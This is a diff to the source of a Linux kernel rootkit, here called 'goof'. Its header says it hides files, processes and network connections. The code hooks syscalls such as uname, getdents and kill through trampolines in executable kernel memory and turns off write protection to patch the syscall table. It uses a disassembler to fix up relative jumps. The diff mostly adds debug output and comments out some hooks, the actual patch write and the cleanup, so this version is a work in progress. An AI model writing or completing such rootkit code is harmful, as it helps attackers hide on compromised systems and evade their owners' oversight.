@@ -5,7 +5,6 @@ Description: trampolining rootkit. Used to hide files, processes, and network co
 Task:
 */
 
-
 #include "goof.h"
 #include "user.h"
 #include "include/beaengine/BeaEngine.h"
@@ -312,11 +311,22 @@ unsigned char *create_tramp(unsigned long *src, unsigned long *new_func, unsigne
 
 	//~~~~~~~original_code~~~~~~~~~~~	
 	//Create a backup of the original code to be
-	//used in creating the trampoline and when
-	//the rootkits exits to clean up restoring
-	//original functions.
+	//used in creating the trampoline and
+    //restoring original functions.
 	h->original_code = kmalloc(h->hook_len, GFP_KERNEL);
 	memcpy(h->original_code, src, h->hook_len);
+	
+    
+    //Calculate size of modified original code by counting the number of jmps
+    //or.... just allocate theoretical maximum.... 75 (15 for hook * 5 for sizeof(jmp))
+
+    //May not be needed
+    //~~~~~~~modified_original_code~~~~~~~~~~~	
+	//Create a backup of the original code to be
+	//used in creating the trampoline.
+    //TODO Actually do math instead of guessing.
+	//h->modified_original_code = kmalloc(75, GFP_KERNEL);
+	//memcpy(h->modified_original_code, src, 75);
 
 	//~~~~~~~trampoline~~~~~~~~~~~	
 	//Create the trampoline that will be called by
@@ -325,9 +335,46 @@ unsigned char *create_tramp(unsigned long *src, unsigned long *new_func, unsigne
 	//Memory must be executable
 	//Allocate enough memory to accomodate the length of the syscall specific hook
 	//and also our jump back (15 bytes)
-	h->trampoline =  __vmalloc(h->hook_len + HOOK_LEN, GFP_KERNEL, PAGE_KERNEL_EXEC);
-	
+    //                                                  V Extra space for "jmp" extensions
+	h->trampoline =  __vmalloc(h->hook_len + HOOK_LEN + (15*10), GFP_KERNEL, PAGE_KERNEL_EXEC);
+/*
+	printk("\n[goof] trampoline %p\n\t[goof] ", h->trampoline);
+	for(int i = 0; i < h->hook_len*2; i++){
+        printk("%02x ", h->trampoline[i]);
+    }
+    printk("\n");*/
+        /*
 	//TODO:
+	DISASM MyDisasm;
+	int len = 0;
+	int Error = 0;
+	(void) memset(&MyDisasm, 0, sizeof(DISASM));
+	MyDisasm.EIP = h->trampoline; 
+    unsigned long int rel_dest = 0;
+	for(int i = 0; i < (h->hook_len + HOOK_LEN + (15*10)); i++){
+		len = Disasm(&MyDisasm);
+		//printk("instruction branch type: %d\n", MyDisasm.infos.INSTRTYPE.BranchType);
+        printk("EIP: %p", MyDisasm.EIP);
+		printk("instruction branch type: %d\n", MyDisasm.Instruction.BranchType);
+        if(MyDisasm.Instruction.BranchType == 11){
+            printk("Relative jump operand: %p", MyDisasm.Instruction.Immediat);
+            printk("Trying to jump to absolute address: %p", 0);
+            for(int j = 0; j < len; j++){
+                printk("%02x ", *(((unsigned char *)MyDisasm.EIP)+j));
+                if(MyDisasm.Instruction.BranchType == 11 && j == 1 ){
+                   memcpy(&rel_dest, ((unsigned char *)MyDisasm.EIP)+1, 4);
+                }
+            }
+            unsigned long long int abs_dest = ((unsigned char *)MyDisasm.EIP + rel_dest);
+            printk("dest: %i", rel_dest);
+            printk("dest: %08x", abs_dest);
+            printk("eip:  %08x", (unsigned char *)MyDisasm.EIP);
+        }
+        i += len;
+		MyDisasm.EIP = MyDisasm.EIP + len;
+		printk("\n");
+	}
+		*/
 	// 1. Iterate through og_code instructions, copying them into trampoline
         // 2. Check if instruction is a relative jump *Check for relative jumps that stay within the og_code*
 	// 3. Calculate absolute destination (og_func + relative jump offest + relative jump address)
@@ -356,10 +403,10 @@ unsigned char *create_tramp(unsigned long *src, unsigned long *new_func, unsigne
 	//back to syscall + hook_len	
 
 	printk("\n[goof] trampoline %p\n\t[goof] ", h->trampoline);
-    for(int i = 0; i < h->hook_len*2; i++){
-        printk("%02x ", h->trampoline[i]);
-    }
-    printk("\n");
+	for(int i = 0; i < h->hook_len*2; i++){
+            printk("%02x ", h->trampoline[i]);
+        }
+        printk("\n");
 
 	//~~~~~~~Insert hook into syscall~~~~~~~~~~~	
 	unsigned char *jump = kmalloc(h->hook_len, GFP_KERNEL);
@@ -375,7 +422,7 @@ unsigned char *create_tramp(unsigned long *src, unsigned long *new_func, unsigne
 	//Write hook to syscall table
 	printk("[goof] Memory hasn't been written\n");
 	DISABLE_W_PROTECTED_MEMORY
-	memcpy(src, jump, h->hook_len);
+	//memcpy(src, jump, h->hook_len);
 	ENABLE_W_PROTECTED_MEMORY
 
 	return NULL;
@@ -404,18 +451,68 @@ int number_of_bytes_to_pad_jump(unsigned char *src ){
 	DISASM MyDisasm;
 	int len = 0;
 	int Error = 0;
-
 	(void) memset(&MyDisasm, 0, sizeof(DISASM));
 	MyDisasm.EIP = src; 
 	for(int i = 0; i < 12 && res < HOOK_LEN ; i++){
 		len = Disasm(&MyDisasm);
+		//printk("instruction branch type: %d\n", MyDisasm.infos.INSTRTYPE.BranchType);
+        printk("EIP: %p", MyDisasm.EIP);
+/*
+		printk("instruction branch type: %d\n", MyDisasm.Instruction.BranchType);
+        if(MyDisasm.Instruction.BranchType == 11){
+            printk("Relative jump operand: %p", MyDisasm.Instruction.Immediat);
+            printk("Trying to jump to absolute address: %p", 0);
+            
+            printk("struct Disasm {");
+            printk("   UInt64 VirtualAddr; %p", MyDisasm.VirtualAddr);
+            printk("   UInt64 Options; %llu", MyDisasm.Options);
+            printk("...};");
+
+            printk("struct INSTRTYPE {");
+            printk("  Int32 Category; %d", MyDisasm.Instruction.Category);
+            printk("  Int32 Opcode; %d", MyDisasm.Instruction.Opcode);
+            printk("  char Mnemonic[24]; %s", MyDisasm.Instruction.Mnemonic);
+            printk("  Int32 BranchType; %d", MyDisasm.Instruction.BranchType);
+            printk("  EFLStruct Flags; %p", MyDisasm.Instruction.Flags);
+            printk("  UInt64 AddrValue; %p", MyDisasm.Instruction.AddrValue);
+            printk("  Int64 Immediat; %d", MyDisasm.Instruction.Immediat);
+            printk("  UInt32 ImplicitModifiedRegs; %d", MyDisasm.Instruction.ImplicitModifiedRegs);
+            printk("};");
+
+            printk("struct OPTYPE {");
+            printk("  char ArgMnemonic[24]; %s", MyDisasm.Argument1.ArgMnemonic);
+            printk("  UInt64 ArgType; %p", MyDisasm.Argument1.ArgType);
+            printk("  Int32 ArgSize; %ld", MyDisasm.Argument1.ArgSize);
+            printk("  UInt32 AccessMode; %lu", MyDisasm.Argument1.AccessMode);
+            printk("  MEMORYTYPE Memory; %d", MyDisasm.Argument1.Memory);
+            printk("  UInt32 SegmentReg; %lu", MyDisasm.Argument1.SegmentReg);
+            printk("};");
+
+            printk("typedef struct MEMORYTYPE {");
+            printk("   Int32 BaseRegister; %lu", MyDisasm.Argument1.Memory.BaseRegister);
+            printk("   Int32 IndexRegister; %lu", MyDisasm.Argument1.Memory.IndexRegister);
+            printk("   Int32 Scale; %lu", MyDisasm.Argument1.Memory.Scale);
+            printk("   Int64 Displacement; %llu", MyDisasm.Argument1.Memory.Displacement);
+        }
+*/
 		printk("len: %d\n", len);
+        unsigned long int rel_dest = 0;
+        //unsigned long long dest = 0;
 		for(int j = 0; j < len; j++){
 			printk("%02x ", *(((unsigned char *)MyDisasm.EIP)+j));
+            if(MyDisasm.Instruction.BranchType == 11 && j == 1 ){
+               memcpy(&rel_dest, ((unsigned char *)MyDisasm.EIP)+1, 4);
+            }
 		}
+        unsigned long long int abs_dest = ((unsigned char *)MyDisasm.EIP + rel_dest);
+        //printk("dest: %02x %02x %02x %02x", dest[0], dest[1], dest[2], dest[3]); 
+/*
+        printk("dest: %i", rel_dest);
+        printk("dest: %08x", abs_dest);
+        printk("eip:  %08x", (unsigned char *)MyDisasm.EIP);
+*/		
 		res += len;
 		MyDisasm.EIP = MyDisasm.EIP + len;
-		
 		printk("\n");
 	}
 	return res;
@@ -451,23 +548,30 @@ goof_init(void) {
 	int padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_uname]);
 	create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, padding_size);
 	printk("Hooked uname with %d bytes\n\n",padding_size);
+	/*unsigned char *kmem_ptr = (unsigned char*)__sys_call_table[__NR_uname]; 
+	printk("kmem_ptr=%x", kmem_ptr);
+	for(unsigned char i = 0; i < padding_size + HOOK_LEN; i++){
+		printk("%02x ", *(kmem_ptr+i));
+	}*/
+	//create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, padding_size);
+	//printk("Hooked uname with %d bytes\n\n",padding_size);
 	 
-	padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_getdents]);
-	create_tramp((unsigned long*)__sys_call_table[__NR_getdents], (unsigned long *)goofy_getdents, 1, padding_size);
-	printk("Hooked getdents with %d bytes\n\n", padding_size);
+	//padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_getdents]);
+	//create_tramp((unsigned long*)__sys_call_table[__NR_getdents], (unsigned long *)goofy_getdents, 1, padding_size);
+	//printk("Hooked getdents with %d bytes\n\n", padding_size);
 	
-	padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_kill]);
-	create_tramp((unsigned long*)__sys_call_table[__NR_kill], (unsigned long *)goofy_kill, 2, padding_size);
-	printk("Hooked kill with %d bytes\n\n", padding_size);
+	//padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_kill]);
+	//create_tramp((unsigned long*)__sys_call_table[__NR_kill], (unsigned long *)goofy_kill, 2, padding_size);
+	//printk("Hooked kill with %d bytes\n\n", padding_size);
 
 
 	return 0;
 }
 static void __exit
 goof_exit(void) {
-	remove_tramp(0);
-	remove_tramp(1);
-	remove_tramp(2);
+//	remove_tramp(0);
+//	remove_tramp(1);
+//	remove_tramp(2);
 
 /*
 	DISABLE_W_PROTECTED_MEMORY
